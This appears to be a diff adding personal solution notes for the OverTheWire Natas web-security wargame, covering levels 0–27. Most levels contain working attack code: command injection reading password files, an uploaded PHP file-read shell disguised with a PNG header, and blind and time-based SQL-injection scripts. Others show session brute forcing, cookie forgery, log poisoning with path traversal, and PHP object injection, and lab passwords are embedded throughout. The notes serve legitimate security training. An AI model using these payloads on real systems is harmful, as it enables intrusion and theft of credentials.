@@ -1,0 +1,332 @@
+* 0
+  simple view source
+* 1
+  right click disabled. Same.
+* 2
+  see source. there is a png file.
+  try to access ~/files~
+  there is a directory listing. password to next level in ~users.txt~
+* 3
+  not even google will find it this time
+  look at ~/robots.txt~ found ~/s3cr3t~ directory disallowed.
+  just go and look
+* 4
+  authorized user should come from xxx
+  use Tamper Chrome
+  change the Referer header
+* 5
+  ~loggedin~ cookie. just set to 1
+  I used EditThisCookie from Chrome
+* 6
+  view source. See secret is in ~/includes/secret.inc~
+  submit the secret
+* 7
+  see there's a page parameter
+  try giving it some file path ~/etc/natas_webpass/natas8~
+  it just works
+* 8
+  similar to 6. given cipher and encoding method. find decoded message.
+  just reverse it.
+  (i used c source block because php has no syntax highlighting)
+  #+BEGIN_SRC c
+  $encoded="3d3d516343746d4d6d6c315669563362";
+  print base64_decode(strrev(hex2bin($encoded)));
+  #+END_SRC
+* 9
+  They are using ~grep -i $key dictionary.txt~
+  just give it ~;cat /etc/natas_webpass/natas10;~
+* 10
+  ~;~ and ~&~ are filtered
+  can still give ~grep~ multiple files to search
+  ~1 /etc/natas_webpass/natas11~
+  (since pass should contain some number but dictionary doesn't)
+* 11
+  xor decrypts cookie
+  #+BEGIN_SRC c
+    $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
+    $cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D";
+    function xor_s($a,$b){
+      $out="";
+      for($i=0;$i<strlen($a);$i++){
+        $out .= $a[$i] ^ $b[$i];
+      }
+      return $out;
+    }
+    print xor_s(json_encode($defaultdata),base64_decode($cookie));
+  #+END_SRC
+  use above to get the key "qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq"
+  add that to original script
+  #+BEGIN_SRC c
+  $defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");
+  function xor_encrypt($in) {
+      $key = 'qw8J';
+      $text = $in;
+      $outText = '';
+
+      // Iterate through each character
+      for($i=0;$i<strlen($text);$i++) {
+      $outText .= $text[$i] ^ $key[$i % strlen($key)];
+      }
+
+      return $outText;
+  }
+  function printData($d) {
+      print base64_encode(xor_encrypt(json_encode($d)));
+  }
+  printData($defaultdata);
+  #+END_SRC
+  Just replace cookie with output from this and done.
+* 12
+  We upload a file. The server displays a link to it. replace the filename with random string but extension unchanged.
+  Create a php file:
+  #+BEGIN_SRC c
+  <?php  
+  $pass = fopen("/etc/natas_webpass/natas13","r");
+  echo fread($pass,filesize("/etc/natas_webpass/natas13"));
+  fclose($pass);
+  ?>
+  #+END_SRC
+  upload it. use tamper data to change the extension to php. (so the server will execute the php)
+* 13
+  same as before but use ~exif_imagetype~ which checks the first few bytes.
+  just prepend the file from previous one by the magic number of , eg. png
+  ~(echo $'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' | cat - natas12.php > natas13.php)~
+  Then repeat last level
+* 14
+  basic sql injection ~(" or 1=1 -- )~
+* 15
+  First, check that natas16 exists.
+  ~(natas16" and length(password)=32 -- )~ verifies that the password is of length 32
+  Write a script to use SUBSTRING(string,pos,len) (pos is 1-indexed) to deduce the password of natas16. The server is using MySql.
+  Need to handle authentication. Be careful of the case sensitivity
+  #+BEGIN_SRC python
+  import requests
+  host="http://natas15.natas.labs.overthewire.org"
+  postdata=dict()
+  postdata['username']='natas16'
+  username="natas15"
+  password="AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
+  r = requests.post(host,data=postdata,auth=(username,password))
+
+  pass_len = 32
+  chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+  ans = ""
+  for i in range(1,pass_len+1):
+      for c in chars:
+          postdata['username']='natas16" and SUBSTRING(password,'+str(i)+',1)="'+str(c)+'" COLLATE latin1_bin -- '
+          r = requests.post(host,data=postdata,auth=(username,password))
+          if "exists" in r.text:
+              print str(i)+"th character is " + str(c)
+              ans += c
+              break
+      else:
+              print "character failed"
+              break
+  print ans
+  #+END_SRC
+* 16
+  similar to 10. filtered ~(;|&`'")~
+  Also added quotes around key
+  Can still use ~$()~. can make use of the fact that ~grep -L~ will print the name of the file that DOES NOT match.
+  So try each character. If matched, nothing will be printed (so if we attach something else after that, that will match), otherwise, nothing will be printed (since ~/etc/xxxx/xxx~ is not in the dictionary)
+  #+BEGIN_SRC python
+  import requests
+  chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+  username="natas16"
+  password="WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
+  host="http://natas16.natas.labs.overthewire.org"
+  ans = ""
+  data = dict()
+  data['submit']= 'Search'
+  while True:
+      for c in chars:
+          data['needle']='$(grep -L ^'+ans+str(c)+'.* /etc/natas_webpass/natas17)hackers'
+          r = requests.get(host,params=data,auth=(username,password))
+          if "hackers" in r.text:
+              print "success "+c
+              ans += c
+              break
+      else:
+          break
+  print ans
+  #+END_SRC python
+* 17
+  SQL injection again. But no output. Use time-based blind injection. ~requests~ has a timeout feature which is handy
+  weirdly it fails in the middle a couple of times. I have to output intermediate result and adjust starting point
+  Also, at first I got the wrong answer due to some bad network condition. It is correct after I increased the timeout
+  #+BEGIN_SRC python
+  import requests
+
+  def query(i,c):
+      return 'natas18" and if(substring(password collate latin1_bin,'+str(i)+',1)="'+str(c)+'",sleep(500),null) -- '
+
+  chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+  username="natas17"
+  password="8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
+
+  host="http://natas17.natas.labs.overthewire.org"
+  ans=""
+  data=dict()
+  for i in range(1,33):
+      for c in chars:
+          data['username']=query(i,c)
+          try:
+              r = requests.post(host,data=data,auth=(username,password),timeout=10)
+          except requests.exceptions.Timeout:
+              print str(i),ans
+              ans+=c
+              break
+      else:
+          print "failed.."
+          break
+  print ans
+  #+END_SRC
+* 18
+  Session ID 1-640
+  There must be some session with admin logged in.
+  bruteforce every possible session
+  #+BEGIN_SRC python
+import requests
+
+host="http://natas18.natas.labs.overthewire.org"
+
+username="natas18"
+password="xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
+
+cookies=dict()
+for i in range(0,641):
+    print i
+    cookies['PHPSESSID']=str(i)
+    r = requests.get(host,cookies=cookies,auth=(username,password))
+    if not "regular" in r.text:
+        print r.text
+        break
+  #+END_SRC
+* 19
+  Need to notice that session id is replaced by the form of "id-username" all in ascii hex. try all possible combinations with "admin" as username
+  #+BEGIN_SRC python
+import requests
+
+host="http://natas19.natas.labs.overthewire.org"
+
+username="natas19"
+password="4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
+
+cookies=dict()
+def gencookie(i):
+    cookie=str(i)+"-admin"
+    return cookie.encode("hex")
+# backwards. hopefully will be faster
+for i in range(640,-1,-1):
+    print i
+    cookies['PHPSESSID']= gencookie(i)
+    r = requests.get(host,cookies=cookies,auth=(username,password))
+    if not "regular" in r.text:
+        print r.text
+        break
+
+  #+END_SRC
+* 20
+  Read the source code. it saves the session info in a file in the format of ~key value\n~ So if value contains ~\n~ it will be recognised as another key-value pair on next read.
+  give it ~http://natas20.natas.labs.overthewire.org/index.php?debug=true&name=admin%0Aadmin%201~
+  (~%0A~ is urlencoded linebreak). (since read precedes write, need to access the above url twice.)
+* 21
+  still session attack.
+  two websites colocate on the same server.
+  Set the session to be the same so they modify the same session file.
+  in the second website, intercept the post request and add one field : ~admin=1~ this changes the session file for the first one as well.
+* 22
+  If not logged in as admin, server sends a ~Location: /~ header to the browser to redirect to first page.
+  just add ~revelio=xxx~ and intercept the first response
+  use ~curl -u natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ "http://natas22.natas.labs.overthewire.org/?revelio=true~
+  or the following python code (note requests by default handles redirection. So need to use history
+  #+BEGIN_SRC python
+import requests
+username="natas22"
+password="chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"
+host="http://natas22.natas.labs.overthewire.org/"
+r = requests.get(host,params={'revelio':"true"},auth=(username,password))
+print r.history[0].text
+  #+END_SRC
+* 23
+  See the code. If password contains "iloveyou" and greater than 10 when evaulated as integer, print the ans.
+  From PHP manual, empty string is false. otherwise it is true.
+  the first portion of string is considered as integer.
+  so give it "100iloveyou"
+* 24
+  print out the password if ~!strcmp($_REQUEST["passwd"],"<censored>")~
+  in ~strcmp~ manual, it will return ~NULL~ (which is false) if an array is passed in.
+  so give it ~?passwd[]=a~
+  (php will read such queries as arrays)
+  see http://php.net/manual/en/function.parse-str.php
+* 25
+  server writes request into a log file
+  also includes a file based on request parameters. 
+  filters ~../~ but not recursively so just give ~....//~
+  disables ~natas_webpass~ so we send php code in User Agent header, wait for it to be logged in a file (which we know the exact path), and display that in the request. ~http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//tmp/natas25_vqese2k5uncc5ghri4a2ejpbg1.log~
+  send ~echo file_get_contents("/etc/natas_webpass/natas26")~ in user agent
+* 26
+  Read this: https://www.owasp.org/index.php/PHP_Object_Injection
+  We see in ~drawfromuserdata~ it reads from cookie and perform ~unserialize~ directly on the cookie.
+  We can create an object and create a php file which reads the password and simply navigate to the php file.
+  Note: no trailing new lines in the cookie
+  #+BEGIN_SRC c++
+
+<?php
+class Logger{
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+
+    function __construct(){
+        // initialise variables
+        $this->initMsg="#--session started--#\n";
+        // Note use single quotes since serialize by default use double quotes
+        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27')?>";
+        $this->logFile = "img/test.php";
+
+        // write initial message
+        // $fd=fopen($this->logFile,"a+");
+        // fwrite($fd,$initMsg);
+        // fclose($fd);
+    }
+
+    function log($msg){
+        $fd=fopen($this->logFile,"a+");
+        fwrite($fd,$msg."\n");
+        fclose($fd);
+    }
+
+    function __destruct(){
+        // write exit message
+        ;
+    }
+}
+$logger = new Logger;
+echo serialize($logger);
+echo base64_encode(serialize($logger));
+?>
+  #+END_SRC
+* 27
+  Key thing to note here: we want to get into user ~natas28~. New user will get created if doesn't exist in the database. The database gets cleared every 5 minutes (a comment at the top). ~dumpData~ writes all rows matching a username. Wonder what will happen if we create the user natas28 before they did.
+  #+BEGIN_SRC python
+import requests
+
+host = "http://natas27.natas.labs.overthewire.org/"
+username="natas27"
+password="55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ"
+data=dict()
+data["username"]="natas28"
+data["password"]="test"
+r = requests.post(host,data=data,auth=(username,password))
+print r.text
+print "==================================="
+while "Wrong" in r.text:
+    try:
+        r = requests.post(host,data=data,auth=(username,password))
+    except requests.exceptions.ConnectionError:
+        print "connection error"
+print r.text
+  #+END_SRC
+  Run the script. Until it says user natas28 is created. Then just login using the credentials and check the password
+* 28
